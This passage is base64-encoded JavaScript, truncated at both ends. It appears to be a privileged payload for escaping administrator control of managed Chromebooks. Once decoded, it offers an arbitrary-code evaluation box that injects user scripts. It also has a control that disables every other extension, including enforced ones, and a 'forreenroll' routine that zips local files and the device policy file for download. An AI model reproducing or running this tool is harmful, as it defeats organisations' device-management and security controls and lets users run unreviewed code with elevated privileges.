dGhpei5wcmV2aWV3aW5nID0gZmFsc2U7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9LCAxMDApOwogICAgICAgICAgICAgICAgICAgICAgICB9OwoKICAgICAgICAgICAgICAgICAgICAgICAgZGl2LmFwcGVuZENoaWxkKHByZXZpZXdCdXR0b24pOwogICAgICAgICAgICAgICAgICAgICAgICB0YWJsaXN0LmFwcGVuZENoaWxkKGRpdik7CiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgdGhpei50YWJMaXN0SW5Qcm9ncmVzcyA9IGZhbHNlOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgfQogICAgYWN0aXZhdGUoKSB7CiAgICAgICAgZG9jdW1lbnQuYm9keS5pbnNlcnRBZGphY2VudEhUTUwoCiAgICAgICAgICAgICJiZWZvcmVlbmQiLAogICAgICAgICAgICBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLnRlbXBsYXRlCiAgICAgICAgKTsKCiAgICAgICAgZG9jdW1lbnQuYm9keQogICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2V4dF9kZWZhdWx0IikKICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3JBbGwoImJ1dHRvbiIpCiAgICAgICAgICAgIC5mb3JFYWNoKGZ1bmN0aW9uKGJ0bikgewoKICAgICAgICAgICAgICAgIGJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIHRoaXMub25CdG5DbGlja18uYmluZCh0aGlzLCBidG4pKTsKICAgICAgICAgICAgfSwgdGhpcyk7CiAgICAgICAgZG9jdW1lbnQuYm9keS5xdWVyeVNlbGVjdG9yKCIjZm9ycmVlbnJvbGwiKQogICAgICAgICAgICAuYWRkRXZlbnRMaXN0ZW5lcignY2xpY2snLCBhc3luYyBmdW5jdGlvbiBoYW5kbGVyXyh0YXIpIHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCEoJ0pTWmlwJyBpbiB3aW5kb3cpKTsKICAgICAgICAgICAgICAgIGlmICghKCdKU1ppcCcgaW4gd2luZG93KSkgewogICAgICAgICAgICAgICAgICAgIGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMuZXZhbENvZGUoYXdhaXQgKGF3YWl0IGZldGNoKCJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9qc3ppcC8zLjEwLjEvanN6aXAubWluLmpzIikpLnRleHQoKSk7CiAgICAgICAgICAgICAgICAgICAgc2V0VGltZW91dChoYW5kbGVyXyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY29uc29sZS5sb2coImNyZWF0aW5nIHppcCIpOwogICAgICAgICAgICAgICAgY29uc3QgemlwRmlsZSA9IG5ldyBKU1ppcCgpOwogICAgICAgICAgICAgICAgZm9yIChjb25zdCBmIG9mIGtGaWxlcykgewogICAgICAgICAgICAgICAgICAgIGxldCBidWZmZXI7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgYnVmZmVyID0gYXdhaXQgcmVhZEZpbGUoZik7CiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICAgICAgICAgICAgICBjb25zb2xlLmxvZygiY291bGQgbm90IHJlYWQgZmlsZSAiICsgZik7CiAgICAgICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlOwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB6aXBGaWxlLmZpbGUocG9zaXguYmFzZW5hbWUoZiksIG5ldyBVaW50OEFycmF5KGJ1ZmZlcikpOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgemlwRmlsZS5maWxlKHBvc2l4LmJhc2VuYW1lKGF3YWl0IGZpbmRMYXN0UG9saWN5RmlsZSgpKSwgYXdhaXQgcmVhZEZpbGUoYXdhaXQgZmluZExhc3RQb2xpY3lGaWxlKCkpKTsKICAgICAgICAgICAgICAgIGNvbnN0IHVybCA9IFVSTC5jcmVhdGVPYmplY3RVUkwoYXdhaXQgemlwRmlsZS5nZW5lcmF0ZUFzeW5jKHsKICAgICAgICAgICAgICAgICAgICB0eXBlOiAiYmxvYiIKICAgICAgICAgICAgICAgIH0pKTsKICAgICAgICAgICAgICAgIGNvbnN0IGFlbGVtID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnYScpOwogICAgICAgICAgICAgICAgYWVsZW0uaHJlZiA9IHVybDsKICAgICAgICAgICAgICAgIGFlbGVtLmRvd25sb2FkID0gIiI7CiAgICAgICAgICAgICAgICBhZWxlbS5jbGljaygpOwogICAgICAgICAgICB9KQoKICAgICAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoKTsKICAgICAgICBmb3IgKGxldCBpIGluIGNocm9tZS50YWJzKSB7CiAgICAgICAgICAgIGlmIChpLnN0YXJ0c1dpdGgoIm9uIikpIHsKICAgICAgICAgICAgICAgIGNocm9tZS50YWJzW2ldLmFkZExpc3RlbmVyKCgpID0+IHsKICAgICAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoKTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9CiAgICAgICAgfQoKICAgIH0KICAgIHN0YXRpYyBnZXRGUygpIHsKICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoZnVuY3Rpb24ocmVzb2x2ZSkgewogICAgICAgICAgICB3ZWJraXRSZXF1ZXN0RmlsZVN5c3RlbShURU1QT1JBUlksIDIgKiAxMDI0ICogMTAyNCwgcmVzb2x2ZSk7CiAgICAgICAgfSk7CiAgICB9CiAgICBzdGF0aWMgYXN5bmMgd3JpdGVGaWxlKGZpbGUsIGRhdGEpIHsKICAgICAgICBjb25zdCBmcyA9IGF3YWl0IERlZmF1bHRFeHRlbnNpb25DYXBhYmlsaXRpZXMuZ2V0RlMoKTsKICAgICAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgICAgICBmcy5yb290LmdldEZpbGUoZmlsZSwgewogICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgIH0sIGZ1bmN0aW9uKGVudHJ5KSB7CiAgICAgICAgICAgICAgICBlbnRyeS5yZW1vdmUoZnVuY3Rpb24oKSB7CiAgICAgICAgICAgICAgICAgICAgZnMucm9vdC5nZXRGaWxlKGZpbGUsIHsKICAgICAgICAgICAgICAgICAgICAgICAgY3JlYXRlOiB0cnVlCiAgICAgICAgICAgICAgICAgICAgfSwgZnVuY3Rpb24oZW50cnkpIHsKICAgICAgICAgICAgICAgICAgICAgICAgZW50cnkuY3JlYXRlV3JpdGVyKGZ1bmN0aW9uKHdyaXRlcikgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLndyaXRlKG5ldyBCbG9iKFtkYXRhXSkpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgd3JpdGVyLm9ud3JpdGVlbmQgPSByZXNvbHZlLmJpbmQobnVsbCwgZW50cnkudG9VUkwoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pOwogICAgfQogICAgc3RhdGljIGFzeW5jIGV2YWxDb2RlKGNvZGUpIHsKICAgICAgICBjb25zdCB1cmwgPSBhd2FpdCBEZWZhdWx0RXh0ZW5zaW9uQ2FwYWJpbGl0aWVzLndyaXRlRmlsZSgic3JjLmpzIiwgY29kZSk7CiAgICAgICAgbGV0IHNjcmlwdCA9CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkucXVlcnlTZWxlY3RvcigiI2V2YWx1YXRlX2VsZW0iKSA/PwogICAgICAgICAgICBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzY3JpcHQiKTsKICAgICAgICBzY3JpcHQucmVtb3ZlKCk7CiAgICAgICAgc2NyaXB0ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7CiAgICAgICAgc2NyaXB0LmlkID0gImV2YWx1YXRlX2VsZW0iOwogICAgICAgIHNjcmlwdC5zcmMgPSB1cmw7CiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChzY3JpcHQpOwogICAgfQoKICAgIGFzeW5jIG9uQnRuQ2xpY2tfKGIpIHsKICAgICAgICBzd2l0Y2ggKGIuaWQpIHsKICAgICAgICAgICAgY2FzZSAiY29kZV9ldmFsdWF0ZSI6IHsKICAgICAgICAgICAgICAgIGNvbnNvbGUubG9nKCJFdmFsdWF0aW5nIGNvZGUhIik7CiAgICAgICAgICAgICAgICBjb25zdCB4ID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiI2NvZGVfaW5wdXQiKS52YWx1ZTsKICAgICAgICAgICAgICAgIGNvbnN0IGZzID0gYXdhaXQgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5nZXRGUygpOwogICAgICAgICAgICAgICAgRGVmYXVsdEV4dGVuc2lvbkNhcGFiaWxpdGllcy5ldmFsQ29kZSh4KTsKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXNlICJ0YWJyZWxvYWQiOiB7CiAgICAgICAgICAgICAgICB0aGlzLnVwZGF0ZVRhYkxpc3QoKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQpjbGFzcyBIb3N0UGVybWlzc2lvbnMgewogICAgYWN0aXZhdGUoKSB7fQp9CgpmdW5jdGlvbiBjcmVhdGVFeHRlbnNpb25DYXJkKG5hbWUsIGlkLCBlbmFibGVkLCBpY29uX3VybCkgewogICAgY29uc3QgbGkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaSIpOwogICAgbGkuY2xhc3NOYW1lID0gImV4dGVuc2lvbi1jYXJkIjsKICAgIGxpLmlubmVySFRNTCA9IGAKICAgICAgPGltZyBjbGFzcz0iZXh0ZW5zaW9uLWljb24iIHNyYz0iJHtpY29uX3VybH0iLz4KICAgICAgPHNwYW4gY2xhc3M9ImV4dGVuc2lvbi1uYW1lIj4ke25hbWV9IDxsaXRzdHVmZj4gJHtpZH08L2xpdHN0dWZmPjwvc3Bhbj4KICAgICAgPGxhYmVsIGNsYXNzPSJ0b2dnbGUtc3dpdGNoIj4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgJHtlbmFibGVkID8gImNoZWNrZWQiIDogIiJ9PgogICAgICAgICAgPHNwYW4gY2xhc3M9InNsaWRlciI+PC9zcGFuPgogICAgICA8L2xhYmVsPgogIGA7CiAgICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIGNyZWF0ZUV4dGVuc2lvbkNhcmRBbGwoZW5hYmxlZCA9IHRydWUpIHsKICAgIGNvbnN0IGxpID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgibGkiKTsKICAgIGxpLmNsYXNzTmFtZSA9ICJleHRlbnNpb24tY2FyZC1hbGwiOwogICAgbGkuaW5uZXJIVE1MID0gYAogICAgICA8aW1nIGNsYXNzPSJleHRlbnNpb24taWNvbiIgc3JjPSJodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vVDNNMU40TC9UM00xTjRML3JlZnMvaGVhZHMvbWFpbi9pbWFnZXMvWE9zWC5naWYiLz4KICAgICAgPHNwYW4gY2xhc3M9ImV4dGVuc2lvbi1uYW1lIj5BbGwgRXh0ZW5zaW9uczwvc3Bhbj4KICAgICAgPGxhYmVsIGNsYXNzPSJ0b2dnbGUtc3dpdGNoIj4KICAgICAgICAgIDxpbnB1dCB0eXBlPSJjaGVja2JveCIgJHtlbmFibGVkID8gImNoZWNrZWQiIDogIiJ9PgogICAgICAgICAgPHNwYW4gY2xhc3M9InNsaWRlciI+PC9zcGFuPgogICAgICA8L2xhYmVsPgogIGA7CiAgICByZXR1cm4gbGk7Cn0KCmZ1bmN0aW9uIHVwZGF0ZUV4dGVuc2lvblN0YXR1cyhleHRsaXN0X2VsZW1lbnQpIHsKICAgIHJldHVybiBuZXcgUHJvbWlzZShmdW5jdGlvbihyZXNvbHZlLCByZWplY3QpIHsKICAgICAgICBleHRsaXN0X2VsZW1lbnQuaW5uZXJIVE1MID0gIiI7CiAgICAgICAgbGV0IGNhcmRBbGwgPSBjcmVhdGVFeHRlbnNpb25DYXJkQWxsKCk7CiAgICAgICAgbGV0IGNhcmRJbnB1dEFsbCA9IGNhcmRBbGwucXVlcnlTZWxlY3RvcigiaW5wdXQiKTsKCiAgICAgICAgY2FyZElucHV0QWxsLmFkZEV2ZW50TGlzdGVuZXIoImNoYW5nZSIsIChldmVudCkgPT4gewogICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRTZWxmKGZ1bmN0aW9uKHNlbGYpIHsKICAgICAgICAgICAgICAgIGNocm9tZS5tYW5hZ2VtZW50LmdldEFsbChmdW5jdGlvbihleHRlbnNpb25zKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcikgewogICAgICAgICAgICAgICAgICAgICAgICBhbGVydCgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciBsb2FkaW5nIGV4dGVuc2lvbnM6ICIgKyBjaHJvbWUucnVudGltZS5sYXN0RXJyb3IubWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVqZWN0KGNocm9tZS5ydW50aW1lLmxhc3RFcnJvcik7CiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICBjb25zdCBwcm9taXNlcyA9IFtdOwogICAgICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgZXh0ZW5zaW9ucy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgZXh0SWQgPSBleHRlbnNpb25zW2ldLmlkOwogICAgICAgICAgICAgICAgICAgICAgICBpZiAoZXh0SWQgIT09IHNlbGYuaWQpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHByb21pc2VzLnB1c2goCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLm1hbmFnZW1lbnQuc2V0RW5hYmxlZChleHRJZCwgZXZlbnQudGFyZ2V0LmNoZWNrZWQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIFByb21pc2UuYWxsKHByb21pc2VzKQogICAgICAgICAgICAgICAgICAgICAgICAudGhlbigoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjYXJkSW5wdXRBbGwuZGlzYWJsZWQgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlc29sdmUoKTsKICAgICAgICAgICAgICAgICAgICAgICAgfSkKICAgICAgICAgICAgICAgICAgICAgICAgLmNhdGNoKChlcnJvcikgPT4gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoIkVycm9yIGVuYWJsaW5nL2Rpc2FibGluZyBleHRlbnNpb25zOiAiICsgZXJyb3IubWVzc2FnZSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZWplY3QoZXJyb3IpOwogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICB9KTsKICAgICAgICB9KTsKCiAgICAgICAgZXh0bGlzdF9lbGVtZW50LmFwcGVuZENoaWxkKGNhcmRBbGwpOwoKICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5nZXRBbGwoZnVuY3Rpb24oZXh0bGlzdCkgewogICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICBhbGVydCgiRXJyb3IgbG9hZGluZyBleHRlbnNpb25zOiAiICsgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UpOwogICAgICAgICAgICAgICAgcmV0dXJuIHJlamVjdChjaHJvbWUucnVudGltZS5sYXN0RXJyb3IpOwogICAgICAgICAgICB9CgogICAgICAgICAgICBjb25zdCBvcmRsaXN0ID0gW107CiAgICAgICAgICAgIGV4dGxpc3QuZm9yRWFjaChmdW5jdGlvbihleHRlbnNpb24pIHsKICAgICAgICAgICAgICAgIGlmIChleHRlbnNpb24uaWQgPT09IG5ldyBVUkwobmV3IFVSTChsb2NhdGlvbi5ocmVmKS5vcmlnaW4pLmhvc3QpIHsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBvcmRsaXN0LnB1c2goZXh0ZW5zaW9uKTsKCiAgICAgICAgICAgICAgICBjb25zdCBpY29uID0KICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWNvbnM/LmZpbmQoKGljKSA9PiBpYy5zaXplID09PSAxMjgpID8/CiAgICAgICAgICAgICAgICAgICAgZXh0ZW5zaW9uLmljb25zPy5hdCgtMSk7CgogICAgICAgICAgICAgICAgbGV0IGNhcmQgPSBjcmVhdGVFeHRlbnNpb25DYXJkKAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5uYW1lLAogICAgICAgICAgICAgICAgICAgIGV4dGVuc2lvbi5pZCwKICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uZW5hYmxlZCwKICAgICAgICAgICAgICAgICAgICBpY29uPy51cmwgfHwKICAgICAgICAgICAgICAgICAgICAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1QzTTFONEwvVDNNMU40TC9yZWZzL2hlYWRzL21haW4vaW1hZ2VzL1hPc1guZ2lmIgogICAgICAgICAgICAgICAgKTsKCiAgICAgICAgICAgICAgICBsZXQgY2FyZElucHV0ID0gY2FyZC5xdWVyeVNlbGVjdG9yKCJpbnB1dCIpOwoKICAgICAgICAgICAgICAgIGNhcmRJbnB1dC5hZGRFdmVudExpc3RlbmVyKCJjaGFuZ2UiLCAoZXZlbnQpID0+IHsKICAgICAgICAgICAgICAgICAgICBjaHJvbWUubWFuYWdlbWVudC5zZXRFbmFibGVkKAogICAgICAgICAgICAgICAgICAgICAgICBleHRlbnNpb24uaWQsCiAgICAgICAgICAgICAgICAgICAgICAgIGV2ZW50LnRhcmdldC5jaGVja2VkLAogICAgICAgICAgICAgICAgICAgICAgICAocmVzdWx0KSA9PiB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYWxlcnQoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFcnJvciB1cGRhdGluZyBleHRlbnNpb24gc3RhdHVzOiAiICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2hyb21lLnJ1bnRpbWUubGFzdEVycm9yLm1lc3NhZ2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgICAgIGNhcmQucXVlcnlTZWxlY3RvcigiLmV4dGVuc2lvbi1pY29uIikuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCAoKSA9PiB7CiAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcyA9IEpTT04ucGFyc2UobG9jYWxTdG9yYWdlLmdldEl0ZW0oInVzZXJkZWZJZHMiKSk7CiAgICAgICAgICAgICAgICAgICAgaWYgKHVzZXJkZWZJZHMuaW5jbHVkZXMoZXh0ZW5zaW9uLmlkKSkgewogICAgICAgICAgICAgICAgICAgICAgICB1c2VyZGVmSWRzLnJlbW92ZShleHRlbnNpb24uaWQpOwogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2Uuc2V0SXRlbSgidXNlcmRlZklkcyIsIEpTT04uc3RyaW5naWZ5KHVzZXJkZWZJZHMpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbWFrZVRvYXN0KCJyZW1vdmVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiBmcm9tIHRoZSBsaXN0IiwgMik7CiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgdXNlcmRlZklkcy5wdXNoKGV4dGVuc2lvbi5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5zZXRJdGVtKCJ1c2VyZGVmSWRzIiwgSlNPTi5zdHJpbmdpZnkodXNlcmRlZklkcykpOwogICAgICAgICAgICAgICAgICAgICAgICBtYWtlVG9hc3QoImFkZGVkICIgKyBleHRlbnNpb24uc2hvcnROYW1lICsgIiB0byB0aGUgbGlzdCIsIDIpOwogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgaWYgKGxvY2FsU3RvcmFnZS5nZXRJdGVtKCJ1c2VyZGVmSWRzIikgPT09IEpTT04uc3RyaW5naWZ5KFtdKSkgewogICAgICAgICAgICAgICAgICAgICAgICBkb2N1bWVudAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLnF1ZXJ5U2VsZWN0b3IoIiNkaXNhYmxlLXVzZXJkZWYtZXh0cyIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAuc2V0QXR0cmlidXRlKCJzdHlsZSIsICJkaXNwbGF5OiBub25lOyIpOwogICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAucXVlcnlTZWxlY3RvcigiI2Rpc2FibGUtdXNlcmRlZi1leHRzIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC5zZXRBdHRyaWJ1dGUoInN0eWxlIiwgImRpc3BsYXk6IGlubGluZTsiKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgICBleHRsaXN0X2VsZW1lbnQuYXBwZW5kQ2hpbGQoY2FyZCk7CiAgICAgICAgICAgIH0pOwogICAgICAgICAgICBzYXZlZEV4dExpc3QgPSBvcmRsaXN0OwogICAgICAgICAgICByZXNvbHZlKCk7CiAgICAgICAgfSk7CiAgICB9KTsKfQoKY29uc3QgZmlsZU1hbmFnZXJQcml2YXRlVGVtcGxhdGUgPSBgCiAgPGRpdiBpZD0iZmlsZU1hbmFnZXJQcml2YXRlX2NhcCI+CiAgICA8ZGl2IGlkPSJGTVBfb3BlblVSTCI+CiAgICAgIDxidXR0b24gaWQ9ImJ0bl9GTVBfb3BlblVSTCI+T3BlbiBVUkwgaW4gU2tpb3ZveCB3aW5kb3c8L2J1dHRvbj4KICAgIDwvZGl2PgogIDwvZGl2PgoKYDsKY29uc3QgaHRtbFN0eWxlID0gYAogICAgPHN0eWxlPgogICAgQGltcG9ydCB1cmwoJ2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzMj9mYW1pbHk9R2Vpc3Q6aXRhbCxvcHN6LHdnaHRAMCwxNC4uMzIsMTAwLi45MDA7MSwxNC4uMzIsMTAwLi45MDAmZGlzcGxheT1zd2FwJyk7CiAgICAgIGJvZHkgewogICAgICAgIGZvbnQtZmFtaWx5OiAnR2Vpc3QnLCBzYW5zLXNlcmlmOwogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7CiAgICAgICAgY29sb3I6ICNmZmY7CiAgICAgICAgbWFyZ2luOiAwOwogICAgICAgIHBhZGRpbmc6IDIwcHg7CiAgICAgIH0KICAgIC5iYWNrZ3JvdW5kLWdyaWQgewogICAgICAgIHBvc2l0aW9uOiBmaXhlZDsKICAgICAgICB0b3A6IDA7CiAgICAgICAgbGVmdDogMDsKICAgICAgICByaWdodDogMDsKICAgICAgICBib3R0b206IDA7CiAgICAgICAgYmFja2dyb3VuZC1pbWFnZTogcmFkaWFsLWdyYWRpZW50KCMzMzMgMXB4LCB0cmFuc3BhcmVudCAxcHgpOwogICAgICAgIGJhY2tncm91bmQtc2l6ZTogMnJlbSAycmVtOwogICAgICAgIHotaW5kZXg6IC0xOwogICAgICAgIGFuaW1hdGlvbjogbW92ZUdyaWQgNHMgbGluZWFyIGluZmluaXRlOwogICAgICAgIHRyYW5zaXRpb246IGJhY2tncm91bmQtcG9zaXRpb24teCA0MDBtczsKICAgICAgfQoKICAgICAgQGtleWZyYW1lcyBtb3ZlR3JpZCB7CiAgICAgICAgMCUgewogICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogMCAwOwogICAgICAgIH0KCiAgICAgICAgMTAwJSB7CiAgICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAycmVtIDJyZW07CiAgICAgICAgfQogICAgICB9CgogICAgICAuYmFja2dyb3VuZC1ncmlkOmhvdmVyIHsKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uLXg6IDJyZW07CiAgICAgIH0KICAgICAgYm9keTo6LXdlYmtpdC1zY3JvbGxiYXIsIGRpYWxvZzo6LXdlYmtpdC1zY3JvbGxiYXIsIGRpYWxvZyBkaXY6Oi13ZWJraXQtc2Nyb2xsYmFyIHsKICAgICAgICBkaXNwbGF5OiBub25lOwogICAgICB9CiAgICAgIHAgewogICAgICAgIG1hcmdpbjogNXB4IGF1dG87CiAgICAgIH0KICAgICAgI2Nocm9tZV9tYW5hZ2VtZW50X2Rpc2FibGVfZXh0LCAjZXh0X2RlZmF1bHQgewogICAgICAgICBtYXgtd2lkdGg6IDEyMDBweDsKICAgICAgICAgbWFyZ2luOiAwIGF1dG87CiAgICAgIH0KICAgICAgaDEgewogICAgICAgIGZvbnQtc2l6ZTogMjRweDsKICAgICAgICBtYXJnaW4tYm90dG9tOiAyMHB4OwogICAgICB9CiAgICAgIC5kZXNjcmlwdGlvbiB7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICBjb2xvcjogIzMzMzsKICAgICAgfQogICAgICAuZXh0ZW5zaW9uLWRpc2FibGVyIHsKICAgICAgICBkaXNwbGF5OiBmbGV4OwogICAgICAgIGp1c3RpZnktY29udGVudDogc3BhY2UtYmV0d2VlbjsKICAgICAgICBhbGlnbi1pdGVtczogY2VudGVyOwogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwYTBhMGE7CiAgICAgICAgcGFkZGluZzogMTVweDsKICAgICAgICBib3JkZXItcmFkaXVzOiA4cHg7CiAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgfQogICAgICB1bCB7CiAgICAgICAgbGlzdC1zdHlsZS10eXBlOiBub25lOwogICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgcGFkZGluZy1ib3R0b206IDUwcHg7CiAgICAgIH0KLmV4dGVuc2lvbi1jYXJkIHsKICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwogIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgcGFkZGluZzogMTVweDsKICBib3JkZXItcmFkaXVzOiA4cHg7CiAgZGlzcGxheTogZmxleDsKICBqdXN0aWZ5LWNvbnRlbnQ6IHN0YXJ0OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsKICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MgZWFzZSwgYm9yZGVyLWNvbG9yIDAuM3MgZWFzZTsKfQoKLmV4dGVuc2lvbi1jYXJkOmhhcyhpbnB1dDpjaGVja2VkKSB7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDsKICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwp9CgouZXh0ZW5zaW9uLWNhcmQtYWxsIHsKICBib3JkZXI6IDFweCBzb2xpZCAjMzMzOwogIG1hcmdpbi1ib3R0b206IDEwcHg7CiAgcGFkZGluZzogMTVweDsKICBib3JkZXItcmFkaXVzOiA4cHg7CiAgZGlzcGxheTogZmxleDsKICBqdXN0aWZ5LWNvbnRlbnQ6IHN0YXJ0OwogIGFsaWduLWl0ZW1zOiBjZW50ZXI7CiAgYmFja2dyb3VuZC1jb2xvcjogIzAwMDAwMDsKICB0cmFuc2l0aW9uOiBiYWNrZ3JvdW5kLWNvbG9yIDAuM3MgZWFzZSwgYm9yZGVyLWNvbG9yIDAuM3MgZWFzZTsKfQoKLmV4dGVuc2lvbi1jYXJkLWFsbDpoYXMoaW5wdXQ6Y2hlY2tlZCkgewogIGJhY2tncm91bmQtY29sb3I6ICMwMDA7CiAgYm9yZGVyOiAxcHggc29saWQgIzMzMzsKfQoKICAgICAgLmV4dGVuc2lvbi1pY29uIHsKICAgICAgICB3aWR0aDogMzJweDsKICAgICAgICBwYWRkaW5nLXJpZ2h0OiAyMHB